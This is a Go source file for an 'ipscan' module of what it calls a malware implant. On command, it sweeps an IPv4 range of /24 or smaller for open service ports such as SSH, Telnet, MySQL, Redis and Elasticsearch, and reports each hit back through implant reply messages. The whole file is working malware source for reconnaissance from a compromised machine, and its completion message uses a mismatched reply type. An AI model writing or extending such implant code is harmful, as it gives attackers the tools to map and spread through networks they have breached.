package ip_scan

import (
	"context"
	"fmt"
	"golang.org/x/sync/semaphore"
	"malware/common/messages"
	"malware/common/types"
	"math"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

type state struct {
	running  bool
	scanning bool
	lock     *semaphore.Weighted
}

type settings struct {
	state *state // Tell our loop to stop
}

// Create creates an implementation of settings
func Create() types.Module {
	state := state{running: false, scanning: false, lock: semaphore.NewWeighted(100)}
	return settings{&state}
}

func ScanPort(ip string, port int, timeout time.Duration) bool {
	target := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		if strings.Contains(err.Error(), "too many open files") {
			time.Sleep(timeout)
			return ScanPort(ip, port, timeout)
		}
		return false
	}

	conn.Close()
	return true
}

// Call from 24 -> 32
func ip_range(ip string) (string, int) {
	parts := strings.Split(ip, "/")
	if len(parts) > 2 {
		return "", -1
	}

	bits, err := strconv.Atoi(parts[1])
	if err != nil || bits < 24 || bits > 32 {
		return "", -1
	}

	if net.ParseIP(parts[0]) == nil {
		return "", -1
	}

	if net.ParseIP(parts[0]).To4() == nil {
		return "", -1 // Only ipv4
	}
	ip_trimmed := strings.TrimSpace(parts[0])
	ip_parts := strings.Split(ip_trimmed, ".")

	return ip_parts[0] + "." + ip_parts[1] + "." + ip_parts[2] + ".", int(math.Pow(float64(2), float64(32-bits)))
}

var ports = []int{22, 23, 25, 53, 80, 443, 514, 5431, 3306, 6379, 9200, 9300, 8080, 8000}

func (settings settings) ip_scan(ipscan *messages.IPScan, callback func(*messages.ImplantReply)) {
	if ipscan.Cancel {
		settings.state.scanning = false
	} else if settings.state.scanning {
		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_IPSCAN_RUNNING})
	} else {

		wg := sync.WaitGroup{}
		ip, bits := ip_range(ipscan.IpRange)
		if bits == -1 {
			callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_INVALID_RANGE_IPSCAN})
			return
		}

		settings.state.scanning = true
		for start := 0; start < bits; start++ {
			ip := ip + strconv.Itoa(start)
			settings.state.lock.Acquire(context.TODO(), 1)
			wg.Add(1)

			go func(ip string) {
				defer settings.state.lock.Release(1)
				defer wg.Done()
				for _, port := range ports {
					if ScanPort(ip, port, time.Second/4) {
						ipscan_reply := &messages.IPScanReply{Status: messages.IPScanReply_IN_PROGRESS, Ip: ip, Port: int32(port)}
						callback(&messages.ImplantReply{Module: settings.ID(), Ipscan: ipscan_reply})
					}
				}

			}(ip)
		}

		wg.Wait()

		settings.state.scanning = false
		callback(&messages.ImplantReply{Module: settings.ID(), Portscan: &messages.PortScanReply{Status: messages.PortScanReply_COMPLETE}})
	}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
	ipscan := message.GetIpScan()
	if ipscan == nil {
		return false
	}

	go settings.ip_scan(ipscan, callback)
	return true
}

// Init the state of this module
func (settings settings) Init() {
	settings.state.running = true
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "ipscan" }
